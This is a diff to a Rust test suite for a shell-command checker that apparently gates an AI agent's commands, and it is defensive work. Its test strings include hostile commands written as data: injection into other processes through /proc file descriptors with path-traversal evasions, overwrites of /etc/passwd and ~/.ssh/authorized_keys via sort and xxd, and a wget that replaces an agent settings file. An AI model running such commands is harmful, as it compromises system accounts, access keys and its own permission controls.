@@ -138,15 +138,20 @@ fn a_plain_reader_of_the_works_files_is_not_refused() {
     }
 }
 
-/// FAILS ON REVERT of `writes_into_another_process` (allowed).
+/// FAILS ON REVERT of `writes_into_another_process` (allowed). A write
+/// into another process's input, or any open file of it but its output
+/// and error, is refused, also with `.` and `..` in the path (allowed
+/// before `lexical_components`).
 #[test]
 fn a_write_into_another_process_stream_is_refused_and_the_shells_own_is_not() {
     for command in [
         "echo hi > /proc/1234/fd/0",
-        "echo hi >/proc/1/fd/1",
-        "echo hi >> /proc/$PPID/fd/1",
-        "echo hi | tee /proc/77/fd/2",
+        "echo hi > /proc/1/fd/3",
+        "echo hi > /proc/1/fd/1 2>/proc/1/fd/0",
         "sort -o /proc/1234/fd/0 x",
+        "echo hi > /proc/self/../1/fd/0",
+        "echo hi > /proc/self/fd/../../1/fd/0",
+        "echo hi > /proc/1/./fd/0",
     ] {
         assert_eq!(verdict(command), "deny", "{command}");
     }
@@ -156,6 +161,49 @@ fn a_write_into_another_process_stream_is_refused_and_the_shells_own_is_not() {
         "echo hi > /dev/fd/2",
         "cat /proc/1234/fd/0 > /dev/null",
         "ls -l /proc/1234/fd/",
+    ] {
+        assert_eq!(verdict(command), "allow", "{command}");
+    }
+}
+
+/// FAILS ON REVERT of `ProcessStream::injects` (deny): a job in a
+/// container logs to the container's output through `/proc/1/fd/1` and
+/// `/proc/1/fd/2`, in a line or a crontab entry; held for review, never
+/// refused (allowed on main, refused by the first round of this reading).
+#[test]
+fn a_write_into_another_process_output_is_held_for_review() {
+    for command in [
+        "/app/job.sh > /proc/1/fd/1 2>/proc/1/fd/2",
+        "* * * * * /app/job.sh > /proc/1/fd/1 2>/proc/1/fd/2",
+        "echo started >> /proc/$PPID/fd/1",
+        "echo hi >/proc/1/fd/1",
+        "echo hi | tee /proc/77/fd/2",
+    ] {
+        assert_eq!(verdict(command), "review", "{command}");
+    }
+}
+
+/// FAILS ON REVERT of `long_output` and `xxd_output` (each allowed): GNU
+/// getopt reads `--out` and `--o` as `--output`, and the second operand
+/// of xxd is the file it writes.
+#[test]
+fn an_abbreviated_option_and_the_output_of_xxd_are_judged_as_redirections() {
+    for command in [
+        "sort --out=/etc/passwd x",
+        "sort --o /etc/passwd x",
+        "wget --output-doc=~/.claude/settings.json https://x.example/a",
+        "xxd -r hex.txt /etc/passwd",
+        "xxd -r hex ~/.ssh/authorized_keys",
+        "xxd -c 16 -r -p hex.txt ~/.ssh/authorized_keys",
+    ] {
+        assert_eq!(verdict(command), "deny", "{command}");
+    }
+    for command in [
+        "sort --out=out.txt x",
+        "xxd -r -p hex.txt out.bin",
+        "xxd -r hex.txt",
+        "xxd -i app.bin app.h",
+        "git diff --stat",
     ] {
         assert_eq!(verdict(command), "allow", "{command}");
     }
